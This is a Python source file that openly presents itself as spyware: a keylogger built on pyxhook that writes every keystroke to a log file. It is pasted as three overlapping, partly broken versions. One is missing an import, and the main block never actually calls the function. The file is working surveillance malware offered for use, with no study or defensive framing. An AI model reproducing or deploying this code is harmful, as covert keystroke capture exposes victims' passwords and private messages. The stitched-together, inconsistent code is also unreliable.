#!/usr/bin/env python3

""" Implementation of simple keylogger in Python.
"""

import daemon
import logging
import pyxhook


class Keylogger:
    """ This class represents the code injecting malware. """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        """ Log every keystroke of the user into log file. """
        # Create hook manager.
        hook_manager = pyxhook.HookManager()
        # Assign callback for handling key strokes.
        hook_manager.KeyDown = self._keydown_callback
        # Hook the keyboard and start logging.
        hook_manager.HookKeyboard()
        hook_manager.start()

    def _keydown_callback(self, key):
        """ This function is handler of key stroke event. """
        logging.debug(chr(key.Ascii))

# At the start of your spyware.py
logging.basicConfig(
    level=logging.DEBUG,
    filename='activity.log',
    format='Key: %(message)s',
)
# Codes/spyware.py

import logging

class Keylogger:
    """ This class represents the keylogger functionality. """

    def __init__(self, name):
        self._name = name

    def start_logging(self):
        """ Log every keystroke of the user into log file. """
        # Create hook manager.
        hook_manager = pyxhook.HookManager()
        hook_manager.KeyDown = self._keydown_callback
        hook_manager.HookKeyboard()
        hook_manager.start()

    def _keydown_callback(self, key):
        """ This function handles key stroke events. """
        logging.debug(chr(key.Ascii))

def SimpleSpyware():
    """Function to start the keylogger."""
    keylogger = Keylogger('SimpleSpyware')
    keylogger.start_logging()
# Codes/spyware.py

import logging
import pyxhook  # Make sure you import any necessary libraries

class Keylogger:
    """ This class represents the keylogger functionality. """

    def __init__(self, name):
        self._name = name

    def start_logging(self):
        """ Log every keystroke of the user into log file. """
        hook_manager = pyxhook.HookManager()
        hook_manager.KeyDown = self._keydown_callback
        hook_manager.HookKeyboard()
        hook_manager.start()

    def _keydown_callback(self, key):
        """ Handles key stroke events. """
        logging.debug(chr(key.Ascii))

def SimpleSpyware():
    """ Function to start the keylogger. """
    keylogger = Keylogger('SimpleSpyware')
    keylogger.start_logging()
if __name__ == "__main__":
    SimpleSpyware